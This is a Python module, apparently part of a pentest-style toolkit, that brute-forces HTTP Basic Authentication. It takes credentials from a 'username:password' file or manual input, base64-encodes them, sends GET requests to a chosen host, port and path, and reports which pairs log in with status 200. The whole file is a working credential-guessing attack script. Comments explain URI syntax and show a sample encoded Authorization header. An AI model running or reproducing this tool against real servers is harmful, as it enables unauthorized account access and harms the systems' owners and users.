import urllib3
import base64
import time
from eve_util import EveUtil


class EveClass1:

    eveProtocol = ("http", "https")
    eveHost = "127.0.0.1"
    evePort = "80"
    evePath = "/"
    eveType = ("file", "manual")
    eveProtocolOption = eveProtocol[0]
    eveTypeOption = eveType[0]
    filename = "eve_class1file.txt"

    def __init__(self, utility):
        self.util = utility
        self.eveOperationName = self.get_translation('t_brute_force_of_the_server', 'eve_class1')
        self.eveOperationDescription = self.get_translation('eve_class_one_description', 'eve_class1') + "."
        self.http = urllib3.PoolManager()
        self.fileContent = ""

    def get_translation(self, name, module):
        # get Translation
        return self.util.eveUtilRush(name, module)

    def options(self):
        print(self.get_translation('t_loaded_operation', 'eve_class1') + ": " + self.get_translation('t_brute_force_of_the_server', 'eve_class1'))
        print(self.get_translation('t_scan_options', 'eve_class1') + ":")
        protocol = ""
        i = 1
        protocolLen = len(self.eveProtocol)
        for item in self.eveProtocol:
            protocol = protocol + item
            if (protocolLen == i):
                protocol = protocol + "."
            else:
                protocol = protocol + ", "
            i += 1

        print("\t" + self.get_translation('t_all_available_protocols', 'eve_class1') + ":" + protocol)
        print("\t" + self.get_translation('t_protocol', 'eve_class1') + ":" + self.eveProtocolOption)
        print("\t" + self.get_translation('t_host', 'eve_class1') + ":" + str(self.eveHost))
        print("\t" + self.get_translation('t_port', 'eve_class1') + ":" + str(self.evePort))
        print("\t" + self.get_translation('t_path', 'eve_class1') + ":" + str(self.evePath))
        print("\t" + self.get_translation('t_current_uri', 'eve_class1') + ":" + str(self.eveProtocolOption) + '://' + str(self.eveHost) + ':' + str(self.evePort) + str(self.evePath))

        type = ""
        i = 1
        typeLen = len(self.eveType)
        for item in self.eveType:
            type = type + item
            if(typeLen == i):
                type = type + "."
            else:
                type = type + ", "
            i += 1

        print("\t" + self.get_translation('t_all_available_types', 'eve_class1') + ":" + type)
        print("\t" + self.get_translation('t_type_prepared_to_launch', 'eve_class1') + ":" + self.eveTypeOption)

    def eveSetOptions(self):
        print("\t" + self.get_translation('t_current_protocol', 'eve_class1') + ":" + str(self.eveProtocolOption))
        if(self.eveProtocolOption == self.eveProtocol[0]):
            value = input("(1/5) " + self.get_translation('t_it_is_a_http_protocol', 'eve_class1') + "? (y/n)")
            if (value == "y" or value == "Y"):
                self.eveProtocolOption = self.eveProtocol[0]
            elif (value == "n" or value == "N"):
                self.eveProtocolOption = self.eveProtocol[1]
        else:
            value = input("(1/5) " + self.get_translation('t_it_is_a_https_protocol', 'eve_class1') + "? (y/n)")
            if (value == "y" or value == "Y"):
                self.eveProtocolOption = self.eveProtocol[1]
            elif (value == "n" or value == "N"):
                self.eveProtocolOption = self.eveProtocol[0]
        print("\t(1) " + self.get_translation('t_current_protocol', 'eve_class1') + ":" + str(self.eveProtocolOption))
        del (value)
        print("\t" + self.get_translation('t_current_host', 'eve_class1') + ":" + str(self.eveHost))
        value = input("(2/5) " + self.get_translation('t_specify_new_host_information', 'eve_class1') + "? (y/n)")
        if(value == "y" or value == "Y"):
            host = input(self.get_translation('t_enter_the_host_information', 'eve_class1') + ":\n")
            self.eveHost = str(host)  # TODO. Sec
        print("\t(2) " + self.get_translation('t_current_host', 'eve_class1') + ":" + str(self.eveHost))
        del(value)
        print("\t" + self.get_translation('t_current_port', 'eve_class1') + ":" + str(self.evePort))
        value = input("(3/5) " + self.get_translation('t_specify_new_port', 'eve_class1') + "? (y/n)")
        if (value == "y" or value == "Y"):
            port = input(self.get_translation('t_enter_the_port', 'eve_class1') + ":\n")
            self.evePort = int(port)
        print("\t(3) " + self.get_translation('t_current_port', 'eve_class1') + ":" + str(self.evePort))
        del(value)
        print("\t" + self.get_translation('t_current_path', 'eve_class1') + ":" + str(self.evePath))
        value = input("(4/5) " + self.get_translation('t_specify_new_path_information', 'eve_class1') + "? (y/n)")
        if (value == "y" or value == "Y"):
            path = input(self.get_translation('t_enter_the_path_information', 'eve_class1') + ":\n")
            self.evePath = str(path)  # TODO. Sec
        print("\t(4) " + self.get_translation('t_current_path', 'eve_class1') + ":" + str(self.evePath))
        del (value)
        print("\t" + self.get_translation('t_current_scan_type', 'eve_class1') + ":" + str(self.eveTypeOption))
        if(self.eveTypeOption == self.eveType[0]):
            value = input("(5/5) " + self.get_translation('t_use_data_in_file_for_the_request', 'eve_class1') + "? (y/n)")
            if (value == "y" or value == "Y"):
                self.eveTypeOption = self.eveType[0]
            elif (value == "n" or value == "N"):
                self.eveTypeOption = self.eveType[1]
        else:
            value = input("(5/5) " + self.get_translation('t_it_is_a_manual_request', 'eve_class1') + "? (y/n)")
            if (value == "y" or value == "Y"):
                self.eveTypeOption = self.eveType[1]
            elif (value == "n" or value == "N"):
                self.eveTypeOption = self.eveType[0]
        print("\t(5) " + self.get_translation('t_current_scan_type', 'eve_class1') + ":" + str(self.eveTypeOption))
        del(value)

    def eveOperationStart(self):
        # need specify host and port
        # options: "auto" or "manual" or "file"
        self.options()
        value = input(self.get_translation('t_do_you_want_to_change_the_scan_options', 'eve_class1') + "? (y/n)")
        if (value == "y" or value == "Y"):
            self.eveSetOptions()
        else:
            print(self.get_translation('t_no_options_were_changed', 'eve_class1') + ".")
        del(value)

        # HTTP Request
        # r = self.http.request('GET', 'http://' + str(self.eveHost) + ':' + str(self.evePort) + '/login/index.php?query=query_string&option=option_string#heading1')
        # HTTP Request (1-st possible method for Basic Authentication)
        # r = self.http.request('GET', 'http://username:password@' + str(self.eveHost) + ':' + str(self.evePort) + '/login/index.php')
        # HTTP Request (2-nd possible method for Basic Authentication)
        # r = self.http.request('GET', 'http://' + str(self.eveHost) + ':' + str(self.evePort) + '/login/index.php', headers={'Authorization': 'Basic Base64 Encoding of the username:password string'})
        # URI syntax
        # [scheme] : // [userinfo] @ [host] : [port] [path] ? [query] # [fragment]
        # URI Legenda example(s):
        # [scheme] = http(s)://
        # [userinfo] = username:password@
        # [host] = ip address or domain name space
        # [port] = :port number
        # [path] = /login/index.php
        # [query] = ?query=query_string&option=option_string (with delimiter "&" which stands like as operator AND)
        # [fragment] = #heading1

        # HTTP Request headers example
        # Host: 192.168.56.107:8080
        # User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv: 79.0) Gecko/20100101 Firefox/79.0
        # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        # Accept-Language: en-US, en;q=0.5
        # Accept-Encoding: gzip, deflate
        # Connection: keep-alive
        # Upgrade-Insecure-Requests: 1
        # Authorization: Basic dXNyZmlyc3Q6Zmlyc3R1c3I=

        # Base64 encode and decode algorithm
        # y = b'usrfirst:firstusr'
        # encoded = base64.b64encode(y)
        # #del(y)
        # #y = str('dXNyZmlyc3Q6Zmlyc3R1c3I=')
        # decoded = base64.b64decode(encoded)
        # print(decoded)

        # Scan type: auto, manual, file
        # auto - automatic request(s) to guess username:password
        # manual - manually enter username:password unencoded value
        # file - text file with list of "username:password/n"
        print(self.get_translation('t_current_time', 'eve_class1') + ": " + str(time.ctime()))
        if(self.eveTypeOption == self.eveType[1]):
            # manual
            run = 33
            while (run == 33):
                value = input(self.get_translation('t_please_enter_username_and_password_in_this_format', 'eve_class1') + "\n")
                encoded = base64.b64encode(bytes(value, 'utf-8'))
                del(value)
                self.s = "Fail"
                try:
                    r = self.http.request('GET', str(self.eveProtocolOption) + '://' + str(self.eveHost) + ':' + str(
                    self.evePort) + str(self.evePath), headers={'Authorization': 'Basic ' + str(encoded, 'utf-8')})
                    if(r.status == 200):
                        print(self.get_translation('t_successfully_logged_in_with_status_code', 'eve_class1') + str(r.status) + ".")
                        print(self.get_translation('t_current_time', 'eve_class1') + ": " + str(time.ctime()))
                        self.s = "Success"
                    else:
                        print(self.get_translation('t_no_luck_you_may_try_it_again', 'eve_class1') + str(r.status) + ".")
                    print(self.get_translation('t_response_data', 'eve_class1') + ":")
                    print(r.data)
                except:
                    print(self.get_translation('e_check_connectivity_and_selected_options', 'eve_class1') + ".")
                else:
                    del(r)

                if(self.s != "Success"):
                    value = input(self.get_translation('t_retry', 'eve_class1') + "? (y/n)")
                    if(value == "y" or value == "Y"):
                        print(self.get_translation('t_restarting', 'eve_class1') + "...")
                        run = 33
                    else:
                        del(self.s)
                        print(self.get_translation('t_exiting', 'eve_class1') + "...")
                        run = 0
                        break
                else:
                    del(self.s)
                    print(self.get_translation('t_exiting', 'eve_class1') + "...")
                    run = 0
                    break
        elif(self.eveTypeOption == self.eveType[0]):
            # file
            try:
                filehandler = open(self.filename, "r")
                data = filehandler.read()
                self.fileContent = data
                del(data)
            except:
                print(self.get_translation('e_cannot_read_from_file', 'eve_class1') + str(self.filename))
            else:
                filehandler.close()

            if(self.fileContent):
                i = 0
                data = self.fileContent.split("\n")
                x = len(data)
                while i < x:
                    encoded = base64.b64encode(bytes(data[i], 'utf-8'))
                    self.s = "Fail"
                    try:
                        r = self.http.request('GET',
                                              str(self.eveProtocolOption) + '://' + str(self.eveHost) + ':' + str(
                                                  self.evePort) + str(self.evePath),
                                              headers={'Authorization': 'Basic ' + str(encoded, 'utf-8')})
                        if (r.status == 200):
                            print(self.get_translation('t_successfully_logged_in_with_status_code', 'eve_class1') + str(r.status) + ".")
                            print(self.get_translation('t_credentials_used', 'eve_class1') + ": " + str(data[i]) + ".")
                            print(self.get_translation('t_response_data', 'eve_class1') + ":")
                            print(r.data)
                            print(self.get_translation('t_current_time', 'eve_class1') + ": " + str(time.ctime()))
                            self.s = "Success"
                        else:
                            print(self.get_translation('t_no_luck_using_credentials', 'eve_class1') + ": " + str(data[i]) + ".")
                    except:
                        print(self.get_translation('e_check_connectivity_and_selected_options', 'eve_class1') + ".")
                    else:
                        del(r)
                    time.sleep(1)
                    if (self.s == "Success"):
                        value = input(self.get_translation('t_try_out_for_the_next_one', 'eve_class1') + "? (y/n)")
                        if (value == "y" or value == "Y"):
                            print(self.get_translation('t_continue', 'eve_class1') + "...")
                        else:
                            del(self.s)
                            break
                    i += 1
                    if i == x:
                        break
                else:
                    print(self.get_translation('t_no_operations_were_loaded', 'eve_class1') + ".")
            print(self.get_translation('t_exiting', 'eve_class1') + "...")
        else:
            pass
            # auto
            # TODO. Auto
